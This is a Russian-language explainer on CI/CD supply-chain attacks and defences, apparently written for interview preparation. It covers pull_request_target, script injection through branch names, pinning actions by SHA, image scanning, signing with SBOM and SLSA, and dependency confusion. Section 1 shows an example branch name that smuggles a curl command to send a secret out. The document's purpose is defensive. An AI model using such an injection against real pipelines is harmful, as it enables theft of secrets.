# Атака через конвейер: чужой код рядом с вашими правами

> **Какую проблему решает.** Конвейер исполняет присланный код и чужие действия в том же процессе, где лежат его секреты, а потом выкладывает артефакт, про который надо суметь доказать, что в проде именно он.
> **Кому это надо.** Тому, кого спросят «чем опасен `pull_request_target`», «зачем закреплять действие по SHA» и «как вы докажете, что в проде ваш образ».
> **Когда НЕ надо.** Всё отсюда отвечает на вопрос «то ли это, что мы собрали», а не «хорошее ли это»: подписанный образ с полным SBOM может содержать дыру в авторизации.

**Границы.** Секреты, OIDC, права токена и гейты — [`PIPELINE_CREDENTIALS.md`](PIPELINE_CREDENTIALS.md). Тег против дайджеста и доступ в реестр — [`IMAGE_REGISTRY_AND_TAGS.md` §1, §2](IMAGE_REGISTRY_AND_TAGS.md); воспроизводимая сборка — [`JAVA_BUILD_IN_CI.md` §7](JAVA_BUILD_IN_CI.md); чужой код на собственном исполнителе — [`RUNNERS.md` §4](RUNNERS.md).

---

## 1. `pull_request_target` и инъекция через контекст события

Обычное событие пулл-реквеста прав не даёт намеренно: «secrets are not passed to the runner when a
workflow is triggered from a forked repository», и запись в репозиторий такому заданию не выдаётся.
Отсюда бытовая задача: комментарий с отчётом о покрытии писать нечем. Рядом находится событие,
которое даёт и права, и секреты:

> «When a workflow is triggered by the `pull_request_target` event, the `GITHUB_TOKEN` is granted
> read/write repository permission, even when it is triggered from a public fork.»
> — GitHub docs, «Workflow syntax»

Событие «runs in the context of the default branch of the base repository» и потому «has write
permission to the target repository… also have access to target repository secrets» (GitHub Security
Lab, «Preventing pwn requests»). Само по себе это не дыра: чекаут по умолчанию берёт **ваш** код. Дыру открывает строка, которую добавляют, чтобы собрать присланное, — явный чекаут
`head.sha`, после которого «the potentially untrusted code is being run during `npm install` or
`npm build`». Для Java не мягче: `pom.xml` исполняем — автор пулл-реквеста объявляет плагин,
привязывает его к фазе и получает исполнение внутри `mvn verify`, рядом с секретами и токеном.

Правильная конструкция разносит «исполнять чужое» и «иметь права» по двум конвейерам: первый
запускается обычным событием, без секретов, и «store any results… in artifacts and exit»; второй
«starts on `workflow_run` where it is granted write permission… and access to repository secrets» и
публикует готовый артефакт. Чужой код исполняется там, где прав нет.

Тот же корень на уровне одной строки: `${{ github.head_ref }}` внутри `run:` подставляется **в текст
скрипта** до его запуска, а имя ветки задаёт автор пулл-реквеста. Ветка с именем
`x"; curl -d "$MY_SECRET" …; #` превращает одну команду в три. Лечится промежуточной переменной
(«set the value of the expression to an intermediate environment variable»): подстановка идёт в
значение, и оболочка получает содержимое как данные — разница та же, что между конкатенацией в SQL
и связанным параметром. Опасны все поля, которые заполняет посторонний: имя ветки, заголовок и тело
пулл-реквеста, комментарий.

## 2. Закрепление действия по SHA

`uses: actions/checkout@v4` не отвечает на вопрос, какой код исполнится завтра: `v4` — тег в Git, а
тег переставляется принудительной отправкой.

> «Pinning an action to a full-length commit SHA is currently the only way to use an action as an
> immutable release.» — GitHub docs, «Secure use reference»

Это та же конструкция, что тег против дайджеста образа
([`IMAGE_REGISTRY_AND_TAGS.md` §1](IMAGE_REGISTRY_AND_TAGS.md)), только вместо байтов образа — код,
исполняемый рядом с вашими секретами и с вашим токеном. Рабочая форма — SHA плюс комментарий с
версией для человека: `actions/checkout@<40-символьный SHA>  # v4.2.2`.

Причина двойная. Бытовая: конвейер краснеет утром понедельника, хотя никто ничего не менял, —
сместилась метка. Серьёзная: компрометация аккаунта автора популярного действия расходится на всех,
кто ссылается на подвижный тег, **молча и одновременно** — без пулл-реквеста, без ревью и без следа
в истории вашего репозитория.

**Чего закрепление не делает.** Оно не делает действие доверенным и не приносит исправлений —
наоборот, замораживает уязвимости, пока SHA не обновят: обновление чужого кода становится осознанным
и оплачивается регулярной работой по подъёму версий.

## 3. Сканирование образа: что оно принципиально не ловит

«Trivy detects known vulnerabilities in software components that it finds in the scan target» — в
этой фразе два ограничивающих слова.

*Components* — пакеты с именем и версией. Ваш код таким компонентом не является: у контроллера нет
версии и нет записи в базе уязвимостей, поэтому дыру в авторизации, обход проверки суммы платежа или
забытый отладочный эндпоинт сканер не видит не потому, что плохо ищет, а потому, что ищет другое.
Он честен и про границы своего знания: «Trivy doesn't support third-party/self-compiled
packages/binaries» — собранный вручную бинарник для него не существует.

*Known* — уже опубликованные. Образ, просканированный вчера, сегодня уязвим при том же дайджесте:
изменился не образ, а знание о нём. Отсюда вывод, который меняет место сканера в конвейере: это
**непрерывная проверка того, что лежит в реестре и работает в проде**, а не разовый гейт перед
`push`. Сканирование только на сборке отвечает на «было ли что-то известно в день сборки»,
а спрашивают «уязвимы ли мы сейчас».

**Когда сканер вреден.** Когда становится порогом «ноль критических находок»: команда учится не
чинить находки, а исключать их из отчёта — файлом игнорирования или отключением проверки «на время
релиза». Тот же механизм, что у порога покрытия
([`JAVA_BUILD_IN_CI.md` §6](JAVA_BUILD_IN_CI.md)).

## 4. Подпись образа, SBOM, SLSA

«Реестр приватный» защищает от чтения, а угроза здесь — запись. Право `push` есть у конвейера, у
администраторов, у любого, кто получил учётные данные
([`PIPELINE_CREDENTIALS.md` §1](PIPELINE_CREDENTIALS.md)), и у того, кто выполнил свой код в задании
(§1). Дайджест честно опишет подложенные байты: он отвечает на «что», а не на «чьё». Три разных
вопроса — три разных артефакта.

*Подпись — «кто собрал».* «Keyless signing associates identities, rather than keys, with an artifact
signature… Fulcio issues short-lived certificates binding an ephemeral key to an OpenID Connect
identity», а «signing events are logged in Rekor, a signature transparency log» (Sigstore). Ключа,
который надо хранить и ротировать, нет: подписывает конвейер той же OIDC-идентичностью, что получает
доступ в облако ([`PIPELINE_CREDENTIALS.md` §2](PIPELINE_CREDENTIALS.md)).

*SBOM — «что внутри».* «A nested inventory, a list of ingredients that make up software components»
(CISA). Состав фиксируется в момент сборки, и это главное: когда завтра объявят уязвимость в
библиотеке, вопрос «затронуты ли мы» решается запросом к спискам сразу по всем образам.

*SLSA — «насколько трудно соврать».*

| Уровень | Что достигнуто | От чего защищает |
|---|---|---|
| Build L1 | provenance есть, но «trivial to bypass or forge» | ошибки процесса релиза |
| Build L2 | «forging the provenance… requires an explicit "attack"» | подмену после сборки — подписью |
| Build L3 | «…requires exploiting a vulnerability beyond the capabilities of most adversaries» | подмену во время сборки: инсайдер, украденные учётные данные |

Граница L2 и L3 содержательна: задание, в котором выполнился чужой код (§1), подпишет то, что
собрало, — честно, с правильной идентичностью и корректным provenance. Подпись закрывает подмену
**после** сборки; изоляция сборки от того, что она собирает, строится отдельно.

**Чего это не даёт.** Подпись, которую никто не проверяет перед запуском, не защищает ни от чего:
проверка живёт в кластере, а не в конвейере, который подписывал. А «собрано из коммита X» проверяемо
только при воспроизводимой сборке ([`JAVA_BUILD_IN_CI.md` §7](JAVA_BUILD_IN_CI.md)).

## 5. Dependency confusion и подмена источника пакетов

Сборка настроена и на внутренний Nexus, и на публичный репозиторий — иначе не скачать Spring, — а
порядок источников оказывается не гарантией, а предпочтением:

> «When using multiple public & private NuGet source feeds, a package can be downloaded from any of
> the feeds.» — Microsoft Learn, «NuGet security best practices»

Отсюда атака из топа OWASP: «publication of malicious packages in public repositories with the same
name as internal package names, in an attempt to trick clients into downloading the malicious package
rather than the private one» (CICD-SEC-03). Имя пакета — глобальное пространство без владельца:
внутри компании оно ваше, снаружи свободно. Доступа ни к чему вашему атакующему не нужно —
достаточно узнать имя, а имена утекают из публичного репозитория, лога сборки и вопроса на форуме.

Защита — «ensure clients are forced to fetch packages that are under your organization's scope solely
from your internal registry» (OWASP): **привязка пространства имён к источнику**, а не порядок
источников — в npm это связывание области (`@acme`) с реестром, в NuGet — Package Source
Mapping, в Maven — правила маршрутизации на репозитории-менеджере. Забывают обычно третье
требование: «make sure that your internal registry does _not_ proxy any package name that has already
been published into it» — иначе защита обходится через ваш же прокси, который сходит за пакетом
наружу.

**Правило.** Всё, что приходит по имени, должно адресоваться содержимым или явным источником:
действие — по SHA (§2), образ — по дайджесту, зависимость — по версии с проверкой суммы и по
реестру, привязанному к пространству имён.

## 6. Шпаргалка

| Вопрос | Ответ одной строкой |
|---|---|
| Чем опасен `pull_request_target` | контекст базы: секреты и токен на запись даже для форка |
| Что превращает его в дыру | явный чекаут `head.sha`: чужой код исполняется в `npm install` или `mvn verify` |
| Лечение инъекции в `run:` | промежуточная переменная: подстановка в значение, а не в текст скрипта |
| Почему SHA, а не тег | тег переставляется; SHA — единственный неизменяемый релиз действия |
| Чего закрепление не даёт | доверия к действию: обновление становится осознанным, а не автоматическим |
| Что сканер не ловит | свой код и логику, самосборные бинарники, ещё не опубликованные уязвимости |
| Почему сканер не разовый гейт | образ не меняется, меняется знание о нём: проверка непрерывна |
| Три вопроса — три артефакта | что внутри → SBOM, кто собрал → подпись, трудно ли соврать → SLSA |
| Граница SLSA L2 и L3 | подпись закрывает подмену после сборки, изоляция — во время неё |
| Защита от dependency confusion | привязка пространства имён к источнику, а не порядок источников |
| Что при этом забывают | запретить внутреннему прокси ходить наружу за уже опубликованным именем |

### Формулировки для собеседования

- «`pull_request_target` даёт секреты и запись базового репозитория; дыру открывает строка, которую добавляют, чтобы собрать присланный код. Правильно — два конвейера: чужое исполняется без прав, права живут там, где чужого кода нет».
- «Инъекция в `run:` — это подстановка в текст скрипта до запуска; промежуточная переменная переводит её в значение, как связанный параметр вместо конкатенации в SQL».
- «Всё, что приходит по имени, адресуется содержимым: действие — по SHA, образ — по дайджесту, зависимость — по версии из привязанного реестра».
- «Сканер отвечает только на "есть ли известные сегодня уязвимости в пакетах"; на "наш ли это образ" отвечает подпись, на "что внутри" — SBOM».
- «Задание, где выполнился чужой код, честно подпишет то, что собрало: подпись закрывает подмену после сборки, а не во время неё — это и есть граница SLSA L2 и L3».

## Источники

- [GitHub: события конвейера](https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows), [Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) — контекст события, чекаут `head.sha`, схема из двух конвейеров.
- [GitHub: Workflow syntax](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax) — токен с правом записи для `pull_request_target` даже из публичного форка.
- [GitHub: Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) — промежуточная переменная против инъекции, закрепление действия по SHA.
- [Trivy docs](https://trivy.dev/latest/docs/) — «known vulnerabilities in software components», неподдерживаемые самосборные пакеты.
- [Sigstore](https://docs.sigstore.dev/cosign/signing/overview/), [CISA SBOM](https://www.cisa.gov/sbom), [SLSA levels](https://slsa.dev/spec/v1.0/levels) — Fulcio и Rekor, определение SBOM, уровни Build L1–L3.
- [OWASP CICD-SEC-03](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-03-Dependency-Chain-Abuse), [npm substitution attacks](https://github.blog/security/supply-chain-security/avoiding-npm-substitution-attacks/), [NuGet best practices](https://learn.microsoft.com/en-us/nuget/concepts/security-best-practices) — подмена имени, привязка области к источнику.
